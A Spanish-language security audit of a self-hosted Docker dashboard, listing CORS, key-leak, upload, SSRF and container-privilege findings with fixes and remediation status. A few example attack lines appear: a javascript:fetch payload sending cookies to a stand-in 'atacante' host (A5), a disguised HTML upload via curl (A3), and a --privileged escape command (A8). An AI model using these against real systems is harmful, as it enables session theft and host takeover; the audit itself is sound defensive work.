# Auditoría de seguridad - Docker Dashboard 0.3.0

Fecha: 2026-10-02. Alcance: backend Express (`src/`), frontend React (`frontend/`), Dockerfile, compose, CI y dependencias. Revisión manual de código más `pnpm audit`.

## Resumen ejecutivo

El modelo de amenaza del proyecto es "red privada, sin login". Dentro de ese modelo el código está razonablemente bien hecho: SQL siempre parametrizado, comparación de API key en tiempo constante, clave nunca exportada, `rel="noopener"` en los enlaces, nada de `dangerouslySetInnerHTML`.

El problema es que el modelo se rompe con facilidad, y cuando se rompe el premio es el socket de Docker, que equivale a root en el host. Los tres hallazgos que importan de verdad:

1. **CORS abierto (`cors()` sin opciones) sobre una API sin autenticación.** Cualquier página web que visite alguien de la LAN puede leer la API key local, parar contenedores, añadir servidores o importar datos. Convierte un "sólo accesible en LAN" en "accesible por cualquier web que visites".
2. **Exfiltración de la API key de servidores remotos** vía `POST /api/hosts/test` con `id` y una `url` del atacante. El hub manda la clave guardada como `Authorization: Bearer` a la URL que le digas.
3. **Subida de archivos sin comprobar extensión** y servida desde el mismo origen. Permite XSS persistente (`.html`, `.svg`) en el dominio del dashboard.

Y una cuestión de despliegue que condiciona todo: el contenedor corre como **root** con el socket de Docker montado. Un RCE en Node es root en el host.

## Estado tras la remediación (2026-10-02)

Fusionado con `feat/direct-docker-hosts`, que entre tanto **retiró el agente** (`/api/agent`, la API key, `agentAccess.ts`) y lee los servidores remotos directamente por `ssh://` o `tcp://`, y añadió un **servidor MCP** en `/mcp` protegido por `MCP_TOKEN`. Eso cambia el estado de varios hallazgos:

| Hallazgo | Estado | Cómo |
|---|---|---|
| A1 CORS abierto | Corregido | `cors` eliminado del proyecto. El frontend es same-origin. El MCP habla por loopback, no desde un navegador. |
| A2 Clave remota a URL arbitraria | Sin objeto | Ya no hay claves por servidor: ssh usa la clave del contenedor y el proxy no tiene ninguna. |
| A3 Subidas sin validar | Corregido | Extensión + mimetype en allow-list y coincidentes, nombre generado, magic bytes verificados tras escribir, SVG fuera (también en la herramienta MCP `upload_icon`), `/uploads` con `nosniff` + CSP `sandbox`. Tests en `uploads.test.ts`. |
| A4 Clave local en el listado | Sin objeto | La API key ya no existe. |
| A5 Import sin validar | Corregido | Validación campo a campo antes de borrar nada; URLs de shortcuts con las mismas reglas que los formularios. Las direcciones de servidor ilegibles se conservan deshabilitadas, como ya hacía la rama destino. |
| A6 SSRF | Mitigado | `parseHostUrl` rechaza link-local, `0.0.0.0`, `::`. Las IPs privadas siguen permitidas: es donde están los servidores. |
| A7 Cabeceras | Corregido | `helmet` con CSP sin inline scripts (el widget de feedback de `devotion.racana.dev` está nombrado explícitamente), `frame-ancestors 'none'`, `X-Frame-Options: DENY`. El registro del SW se movió al bundle. HSTS deliberadamente apagado. |
| A8 Root + socket | Mitigado | Compose con `read_only`, `cap_drop: ALL`, `no-new-privileges`. `DOCKER_HOST` permite que el dashboard lea su propio daemon a través de un socket proxy. El `USER` del Dockerfile se mantiene en root para no romper instalaciones que montan el socket. |
| A9 Backend servido como estático | Corregido | Frontend en `/app/public`, backend en `/app/dist`. |
| A10 Dependencias | Parcial | `multer` 2.4, `express` 4.22.3, `axios` 1.20, `cors` fuera, `@xenova/transformers` fuera. Queda `@grpc/grpc-js` y `uuid` vía `dockerode`, código que esta app no ejecuta; en el frontend sólo tooling de build. |
| A11 Rate limiting | Corregido | `express-rate-limit` en `/api/upload`, `/api/hosts/test`, `/api/import` y `/mcp`. `TRUST_PROXY` para detrás de un proxy. |
| A12 Chat IA | Eliminado | Ambas ramas lo quitaron. |
| A13 SW cachea uploads | Sin cambio | Con A3 y A7 corregidos deja de tener recorrido. |

**Nuevo en la rama destino, revisado de paso:** el endpoint `/mcp` compara el token con hashes en tiempo constante, responde 404 si no está configurado, sólo acepta POST, y las herramientas pasan por las mismas rutas HTTP que el navegador, así que heredan todas las validaciones de arriba. Un token MCP equivale a todo lo que puede hacer la UI, incluido parar contenedores en todos los servidores; el README ya lo dice. Un servidor `ssh://` da al contenedor del dashboard una clave SSH con acceso al grupo `docker` de otra máquina, que es root allí: la carpeta de claves debe ser de sólo lectura y propiedad de root.

Pendiente que no se puede resolver en código: **autenticación** para la UI y la API REST. Sigue siendo necesario un proxy inverso con login delante.

## Hallazgos (estado original)

Severidad: Crítica / Alta / Media / Baja / Informativa.

---

### A1. CORS totalmente abierto sobre una API sin login — ALTA

**Dónde:** [src/server.ts:52](src/server.ts:52) `app.use(cors())`.

**Qué pasa:** `cors()` sin opciones responde `Access-Control-Allow-Origin: *` y acepta cualquier preflight. Como no hay autenticación, una web maliciosa abierta en un navegador de la misma red puede:

- `GET /api/hosts` y leer `agent.api_key` del host local (ver A4).
- `GET /api/export` y llevarse URLs y nombres de todos los servidores.
- `POST /api/hosts/{id}/containers/{id}/stop` y parar contenedores.
- `POST /api/import` y sustituir toda la base de datos.
- `POST /api/hosts` y añadir un servidor que apunte al atacante.

El código del README asume que "estar en la LAN" es la barrera. Con CORS `*` la barrera es "visitar cualquier web desde la LAN".

**Fix:** quitar `cors()` en producción. El frontend se sirve desde el mismo origen y no lo necesita. En desarrollo Vite ya hace proxy a `/api`, así que tampoco. Si se quiere mantener para un caso concreto, restringir a una lista de orígenes por variable de entorno.

---

### A2. El hub envía la API key de un servidor guardado a cualquier URL — ALTA

**Dónde:** [src/routes/hosts.ts:68-115](src/routes/hosts.ts:68) y [src/routes/hosts.ts:172-203](src/routes/hosts.ts:172).

**Qué pasa:** `POST /api/hosts/test` con `{ "id": 2, "url": "http://atacante:80" }` y sin `api_key` hace que el hub use la clave guardada del host 2 ("una clave vacía significa conserva la guardada") y la envíe como `Bearer` a la URL del cuerpo. Lo mismo ocurre con `PUT /api/hosts/2 { "url": "http://atacante" }`: el próximo poll manda la clave allí.

Con A1, esto es explotable desde cualquier web. Sin A1, desde cualquier equipo de la red. El atacante obtiene control de start/stop sobre el servidor remoto.

**Fix:**
- En `/api/hosts/test`, usar la clave guardada sólo si la `url` coincide con la guardada (o no se envía `url`).
- En `PUT /api/hosts/:id`, si cambia la `url` y no llega `api_key`, borrar la clave y dejar el host deshabilitado hasta que se introduzca una nueva. Es el mismo criterio que ya aplica el import.

---

### A3. Subida de imágenes: extensión sin validar, servida en el mismo origen — ALTA

**Dónde:** [src/config/multer.ts:32-36](src/config/multer.ts:32) y [src/config/multer.ts:39-56](src/config/multer.ts:39), servido en [src/server.ts:59](src/server.ts:59).

**Qué pasa:** el filtro mira sólo `file.mimetype`, que lo pone el cliente. El nombre final conserva `path.extname(originalname)`. Así:

```bash
curl -F "image=@evil.html;type=image/png" http://dash:3080/api/upload
# -> uploads/1759...-123.html  servido como text/html desde el origen del dashboard
```

También pasa con `.svg` legítimo: `image/svg+xml` está permitido y un SVG puede llevar `<script>`. Abrirlo directamente en `/uploads/x.svg` ejecuta JS en el origen del dashboard, con acceso a toda la API.

Además, `GET /api/uploads` lista todo el directorio y no hay límite de número de archivos (sí de 20 MB por archivo), así que se puede llenar el disco.

**Fix:**
- Whitelist de extensiones (`png jpg jpeg gif webp ico`) y generar el nombre sin usar `originalname`.
- Quitar SVG o servirlo con `Content-Disposition: attachment` y `Content-Type: application/octet-stream`.
- Servir `/uploads` con `Content-Security-Policy: sandbox` y `X-Content-Type-Options: nosniff`.
- Opcional: validar los magic bytes (por ejemplo con `file-type`).

---

### A4. La API key del host local se devuelve en `GET /api/hosts` — MEDIA

**Dónde:** [src/hosts/registry.ts:210-217](src/hosts/registry.ts:210).

**Qué pasa:** el comentario argumenta que mostrarla "no da nada nuevo porque la página ya puede parar contenedores". Es cierto para quien está delante de la pantalla, pero no para A1 (una web ajena lee el JSON) ni para un proxy inverso que cachee o registre respuestas. La clave convierte acceso puntual en acceso persistente desde fuera de la red si el puerto `/api/agent` está expuesto.

**Fix:** servirla sólo bajo un endpoint explícito (`POST /api/hosts/1/api-key/reveal`), o devolverla únicamente en la respuesta de rotación. Mantener `has_api_key` y `agent.enabled` en el listado.

---

### A5. `POST /api/import` inserta URLs e iconos sin validar — MEDIA

**Dónde:** [src/routes/data.ts:208-227](src/routes/data.ts:208).

**Qué pasa:** la creación y edición de shortcuts valida que `url` sea `http(s)`, pero el import no. Un fichero con `"url": "javascript:fetch('http://atacante/'+document.cookie)"` acaba en `<a href>` ([frontend/src/components/CardShell.tsx:56](frontend/src/components/CardShell.tsx:56)) y se ejecuta al pulsar la tarjeta. Lo mismo para `icon`. Tampoco se comprueban tipos (`position`, `is_favorite`, etc.), y no hay límite de cantidad de filas más allá de los 100 KB por defecto de `express.json`.

El import también hace `DELETE` de todo antes de insertar. Hay backup previo, bien, pero combinado con A1 es un borrado remoto de la configuración desde cualquier web.

**Fix:** pasar cada shortcut por `isValidUrl`/`normalizeUrl` y la misma lógica de icono que el `POST /api/shortcuts`; rechazar el fichero entero si algo no valida.

---

### A6. SSRF desde el hub hacia la red interna — MEDIA

**Dónde:** [src/routes/hosts.ts:33-45](src/routes/hosts.ts:33) `normalizeHostUrl`, usado por `/api/hosts/test` y `/api/hosts`.

**Qué pasa:** la URL de un host puede ser `http://169.254.169.254`, `http://localhost:2375`, `http://10.0.0.5:9200`… El hub hace `GET .../api/agent/ping` y `/containers` allí y devuelve al cliente el código de error traducido (`refused`, `dns`, `timeout`, `bad_response`, `not_an_agent`). Es un escáner de puertos interno con oráculo claro. La respuesta JSON no se devuelve al cliente, lo que limita el daño a enumeración y a los POST de `start/stop/restart`.

**Fix:** rechazar IPs de loopback, link-local y metadata cuando el host es "agent"; o documentarlo como riesgo aceptado dado que el hub ya corre en esa red. Lo mínimo es no permitir que la URL de un agente apunte al propio hub.

---

### A7. Sin cabeceras de seguridad: clickjacking y sin CSP — MEDIA

**Dónde:** [src/server.ts](src/server.ts). No hay `helmet` ni cabeceras manuales.

**Qué pasa:** sin `X-Frame-Options` / `frame-ancestors`, una web puede embeber el dashboard en un iframe invisible y engañar al usuario para pulsar "Stop" o "Replace key". Sin `Content-Security-Policy`, cualquier XSS (A3, A5) tiene vía libre. Sin `X-Content-Type-Options: nosniff`, los archivos subidos pueden interpretarse como HTML.

**Fix:** `helmet()` con una CSP que permita `img-src` a `cdn.jsdelivr.net` (iconos Homarr) y a `https:` para iconos personalizados, `connect-src 'self' https://huggingface.co https://cdn-lfs.huggingface.co` si se mantiene el chat IA, y `frame-ancestors 'none'`.

---

### A8. El contenedor corre como root con el socket de Docker — MEDIA (despliegue)

**Dónde:** [Dockerfile](Dockerfile) (sin `USER`), todos los `docker-compose*.yml`.

**Qué pasa:** `node:22-alpine` ejecuta como root. El montaje `:ro` del socket **no** impide escribir en él (es un socket Unix; `ro` afecta a operaciones de sistema de ficheros, no a `connect()`), y de hecho la app hace `start/stop`. Cualquier RCE en el proceso Node es root en el host: `docker run -v /:/host --privileged`.

Hoy la superficie de RCE es pequeña (no hay `exec` con entrada de usuario; `tailscale.ts` ejecuta cadenas fijas), pero las dependencias cambian (ver A10).

**Fix:**
- `USER node` en el Dockerfile y `group_add: ["<gid del socket>"]` en compose, o usar un proxy de socket como `tecnativa/docker-socket-proxy` con sólo `CONTAINERS=1` y `POST=1`, que es exactamente lo que necesita esta app.
- `read_only: true`, `cap_drop: [ALL]`, `security_opt: [no-new-privileges:true]` en compose.
- Documentar en el README que el socket es el activo a proteger.

---

### A9. `express.static` sirve también el backend compilado — BAJA

**Dónde:** [src/server.ts:56](src/server.ts:56) `app.use(express.static(frontendPath))` y [Dockerfile](Dockerfile), que copia `dist/` del backend y `dist/` del frontend en la misma carpeta.

**Qué pasa:** `GET /server.js`, `/config/database.js`, `/routes/hosts.js` devuelven el código del servidor. El proyecto es MIT y público, así que no se filtra nada secreto, pero revela la versión exacta y facilita buscar vulnerabilidades. También evita que un día alguien meta un `.env` o un fichero de configuración ahí sin darse cuenta.

**Fix:** copiar el frontend a `/app/public` y servir desde ahí, o filtrar `*.js` que no estén bajo `/assets/`.

---

### A10. Dependencias con CVEs conocidos — MEDIA

`pnpm audit --prod` a 2026-10-02:

| Paquete | Dónde | Severidad | Nota |
|---|---|---|---|
| `multer` 2.3.0 | backend directo | moderada | DoS por escrituras huérfanas al abortar subida. Parche ≥ 2.4.0. Relevante: la API no tiene auth. |
| `qs` (vía express 4.22) | backend | moderada x2 | DoS en parseo de query. Parche en express 4.22.x reciente / `qs` ≥ 6.16.0. |
| `@grpc/grpc-js`, `uuid`, `protobufjs` | vía `dockerode` | alta / crítica (protobufjs RCE) | Sólo se usa en código gRPC que esta app no toca, pero está en el bundle de producción. |
| `axios` 1.13.2 | frontend | alta x varios | Prototype pollution, header injection, credential leak. Parche ≥ 1.20.0. El frontend sólo habla con su propio origen, así que el impacto real es bajo. |
| `@xenova/transformers` → `sharp`, `protobufjs`, `onnxruntime` | frontend | alta / crítica | El grueso de las 65 vulnerabilidades del frontend viene de aquí. |

**Fix:** `pnpm update multer express axios`. Para el frontend, evaluar si `@xenova/transformers` (chat IA) se usa de verdad; arrastra 60+ CVEs y descarga modelos de HuggingFace en tiempo de ejecución (ver A12). Si se mantiene, cargarlo con `import()` dinámico para que no entre en el bundle inicial.

---

### A11. Sin rate limiting ni límite de tamaño de cuerpo específico — BAJA

**Dónde:** todo el router.

**Qué pasa:** `express.json()` usa 100 KB por defecto, correcto. Pero no hay límite de peticiones. Endpoints caros sin protección: `/api/shortcuts/auto-sync` hace una petición HEAD a jsDelivr por contenedor nuevo; `/api/hosts/test` abre conexiones salientes arbitrarias (A6); `/api/upload` escribe 20 MB por llamada sin tope global. La API key es de 256 bits con comparación constante, así que el brute force de `/api/agent` no es viable, pero sigue sin haber límite.

**Fix:** `express-rate-limit` en `/api/agent`, `/api/upload`, `/api/hosts/test` y `/api/import`.

---

### A12. Chat IA descarga modelos de HuggingFace y los datos salen del navegador — INFORMATIVA

**Dónde:** [frontend/src/services/ai/](frontend/src/services/ai/), `@xenova/transformers`.

**Qué pasa:** el modelo ONNX se descarga de `huggingface.co` en el navegador del usuario. La inferencia es local, así que los nombres de contenedores no salen, pero el dashboard pasa a depender de un CDN externo y a ejecutar WASM descargado en tiempo de ejecución. Si se despliega en una red aislada, falla. Si HuggingFace sirviera un modelo manipulado, no hay verificación de hash.

**Fix:** documentarlo, fijar la revisión del modelo y comprobar su hash, o empaquetarlo en la imagen. Si la función no está terminada (hay varios `*.example.tsx`), considerar sacarla del bundle de producción.

---

### A13. Service Worker cachea `/uploads` y `/api/settings` — INFORMATIVA

**Dónde:** [frontend/public/sw.js](frontend/public/sw.js).

**Qué pasa:** `staleWhileRevalidate` sobre `/uploads/*` significa que un archivo malicioso subido (A3) sigue sirviéndose desde la caché del navegador aunque se borre del servidor, hasta que el SW revalide. No es una vulnerabilidad en sí, pero alarga la ventana de A3.

---

## Lo que está bien

Para que no quede sólo lo negativo:

- SQL siempre parametrizado con `better-sqlite3`. Los únicos `${}` en SQL son nombres de columna internos en migraciones y `settings.ts`, con valores que vienen de código, no del usuario.
- La comparación de API key usa `timingSafeEqual` con comprobación de longitud previa.
- La clave de servidores remotos nunca se devuelve al navegador ni se exporta. El import deja los servidores deshabilitados hasta que se introduce la clave.
- `/api/agent` responde 404 si no está habilitado, así que no delata que existe.
- Las acciones sobre contenedores están limitadas a `start|stop|restart` con whitelist. No hay `exec`, `rm`, `create` ni acceso a logs/env de contenedores.
- `tailscale.ts` ejecuta sólo comandos fijos, sin interpolar entrada.
- Path traversal en `DELETE /api/uploads/:filename` está cubierto.
- Enlaces externos con `rel="noopener noreferrer"`.
- No hay `dangerouslySetInnerHTML`; el único `innerHTML` es un SVG estático.
- CI: `pull_request` no publica imágenes; el release re-etiqueta por digest en vez de reconstruir; la versión se valida con regex antes de interpolarse en shell.
- El workflow de release separa un paquete de preview privado del público.

## Plan de acción sugerido

Por orden de coste/beneficio:

1. **Quitar `cors()`** o restringirlo. Una línea, elimina A1 y degrada A2, A4 y A5 a "requiere estar en la red".
2. **Arreglar `/api/hosts/test` y `PUT /api/hosts/:id`** para que la clave guardada sólo viaje a la URL guardada (A2).
3. **Whitelist de extensiones + nombre generado + nosniff** en uploads, y quitar SVG (A3).
4. **`helmet()`** con CSP y `frame-ancestors 'none'` (A7).
5. **Validar el import** con las mismas funciones que el `POST` (A5).
6. **`USER node` + docker-socket-proxy** en Dockerfile/compose, y documentarlo (A8).
7. **Actualizar `multer`, `express`, `axios`** y decidir qué hacer con `@xenova/transformers` (A10).
8. Bloquear IPs internas en URLs de agentes (A6) y mover la API key local a un endpoint explícito (A4).
9. Separar frontend y backend en carpetas distintas de `dist` (A9); rate limiting (A11).

Y la recomendación que el propio README ya hace, pero que merece estar más arriba y en negrita: **este dashboard no tiene login. Ponerlo detrás de un proxy con autenticación (Authelia, Caddy basic auth, Tailscale Serve) debería ser el despliegue por defecto en la documentación, no una nota al pie.**
